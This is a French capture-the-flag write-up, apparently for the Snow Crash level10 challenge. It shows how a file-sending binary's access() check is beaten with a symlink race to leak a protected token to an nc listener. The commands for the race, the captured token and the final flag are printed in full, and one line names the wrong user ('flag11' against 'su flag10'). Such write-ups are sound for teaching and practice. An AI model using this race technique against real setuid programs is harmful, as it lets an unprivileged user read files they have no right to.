ls -la

Il y a deux fichiers:
-level10: binaire
-token

Je lance le binaire avec le fichier token en argument:

>./level10 token
>
>./level10 file host
>	sends file to host if you have access to it

Je copie le fichier sur la VM Kali Linux et l'ouvre dans ghidra

>scp -P 4242 level10@<SNOW_CRASH_VM_IP>:/home/user/level10/level10 .

Dans ghidra je remarque un appel a la fonction access(), en me renseignant je decouvre qu'il existe une faille basee sur cette fonction

access() verifie si l'utilisateur qui execute le binaire a les droits de lecture sur le fichier passe en parametre, et plus loin dans le code ce fichier sera lu et envoye sur localhost:6969

Pour exploiter cette faille il faut donner en argument un fichier sur lequel on a les droits pour qu'il passe le access() puis supprimer ce fichier et creer un lien symbolique du meme nom sur un fichier dont on n'a pas les droits.

Sur un autre onglet, il faut lancer un server TCP avec nc -l 0.0.0.0 6969

>chmod 777 .
>touch myfile ; chmod 777 myfile
>./level10 myfile 0.0.0.0 & ln -sf token myfile

Le server TCP recoit:

>.*( )*.
>woupa2yuojeeaaed06riuj63c

J'utilise ce token pour me connecter en tant que flag11 et lancer getflag

>su flag10
>Password:
>
>getflag
>
>Check flag.Here is your token : feulo4b72j7edeahuete3no7c
